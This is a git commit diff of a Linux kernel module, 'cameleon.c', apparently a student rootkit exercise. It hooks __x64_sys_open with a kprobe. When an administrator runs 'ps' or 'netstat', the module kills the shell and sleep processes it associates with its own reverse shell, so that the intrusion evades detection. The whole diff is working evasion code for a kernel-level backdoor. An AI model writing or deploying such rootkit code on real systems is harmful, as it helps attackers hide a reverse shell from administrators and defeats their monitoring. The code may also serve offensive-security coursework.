f801d013428a4daa280e7c7690efeed3427f8765
Juillard Thibault <thibault.juillard@ecole2600.com>
2024-11-19 00:16:01 +0100

    clean cameleon.c

--- mesmodules/cameleon.c
+++ mesmodules/cameleon.c
@@ -6,72 +6,80 @@
 #include <linux/fs.h>
 #include <linux/slab.h>
 #include <linux/uaccess.h>
+#include <linux/net.h>
+#include <linux/file.h>
+#include <net/sock.h>
+#include <linux/fdtable.h>   // Pour struct fdtable et files_fdtable
+#include <linux/spinlock.h>  // Pour spin_lock et spin_unlock
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("tibo.wav");
 MODULE_DESCRIPTION("Hook __x64_sys_open using kprobes");
 
 static struct kprobe kp;
-pid_t our_pids[2] = {0}; // Tableau fixe pour 2 processus
-int our_pids_count = 0;
 
-void kill_all_communications(void);
 bool unplug = false;
 
-/* Fonction pour tuer les processus */
-void kill_all_communications(void) {
+/* Fonction pour rechercher nos processus visible via ps */
+static void find_and_kill_our_processes(void) {
     struct task_struct *task;
-    int i;
+    for_each_process(task) {
+		/* pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm); */
+		/* pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm); */
+        // les sh qui ont pour parent kthreadd
+		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "kthreadd") == 0) {
+        	pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
+			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
+			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
+			send_sig(SIGKILL, task, 0);
+		}
+		// les sh qui ont pour parent sh
+		if (strcmp(task->comm, "sh") == 0 && task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) {
+			pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
+			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
+			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
+			send_sig(SIGKILL, task, 0);
+			
+		}
+		// pour les sleep
+		if (strcmp(task->comm, "sleep") == 0) {
+			pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
+			pr_info("[+] Killing process with PID: %d, name: %s\n", task->pid, task->comm);
+			send_sig(SIGKILL, task, 0);	
+		}
+	}
+}
 
-    for (i = 0; i < 2; i++) {
-        if (our_pids[i] != 0) {
-            task = pid_task(find_vpid(our_pids[i]), PIDTYPE_PID);
-            if (task) {
-                pr_info("[+] Killing process with PID: %d, name: %s\n",
-                        task->pid, task->comm);
-                send_sig(SIGKILL, task, 0);
-            } else {
-                pr_warn("[!] Task struct not found for PID: %d\n", our_pids[i]);
-            }
-        }
-    }
+/* Fonction pour rechercher et tuer le reverse shell */
+static void find_and_kill_reverse_shell(void) {
+	struct task_struct *task;
+	for_each_process(task) {
+		if (strcmp(task->comm, "sh") == 0) {
+			if (task->real_parent && strcmp(task->real_parent->comm, "sh") == 0) {
+				pr_info("[+] Found reverse shell: PID=%d, name=%s\n", task->pid, task->comm);
+				pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
+				pr_info("[+] Killing reverse shell with PID: %d, name: %s\n", task->pid, task->comm);
+				send_sig(SIGKILL, task, 0);
+			}
+		}
+	}
 }
 
 /* Handler pour la fonction hookée (__x64_sys_open) */
 static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
-    pr_info("[+] Hooked __x64_sys_open! PID: %d, name: %s", current->pid, current->comm);
-		
-    if (!unplug && strcmp(current->comm, "ps") == 0) {
-        kill_all_communications();
-		unplug = true;
-    }
-
-    return 0;
-}
-
-/* Fonction pour chercher les processus avec "staf" */
-static void find_our_processes(void) {
-    struct task_struct *task;
-    for_each_process(task) {
-        if (our_pids_count >= 2) {
-            break; // On limite à 2 processus
-        }
-        if (strcmp(task->comm, "sh") == 0) {
-			pr_info("[+] Found process: PID=%d, name=%s\n", task->pid, task->comm);
-			pr_info("[+] Parent process: PID=%d, name=%s\n", task->real_parent->pid, task->real_parent->comm);
-            if (task->real_parent && strcmp(task->real_parent->comm, "kthreadd") == 0) {
-    			pr_info("[+] Found child of khelper: PID=%d, name=%s\n", task->pid, task->comm);
-    			our_pids[our_pids_count++] = task->pid;
-        	}
-    	}
+    /* pr_info("[+] Hooked __x64_sys_open! PID: %d, name: %s", current->pid, current->comm); */
+    if (strcmp(current->comm, "ps") == 0) {
+    	find_and_kill_our_processes();
+    } 
+	if (strcmp(current->comm, "netstat") == 0) {
+		find_and_kill_reverse_shell();
 	}
-    pr_info("[+] Total processes found from us : %d\n", our_pids_count);
+    return 0;
 }
 
 /* Initialisation du module */
 static int __init hook_init(void) {
-    find_our_processes();
-
+	/* find_our_processes();	 */
     kp.symbol_name = "__x64_sys_open";
     kp.pre_handler = handler_pre;
 
@@ -92,4 +100,3 @@ static void __exit hook_exit(void) {
 
 module_init(hook_init);
 module_exit(hook_exit);
-
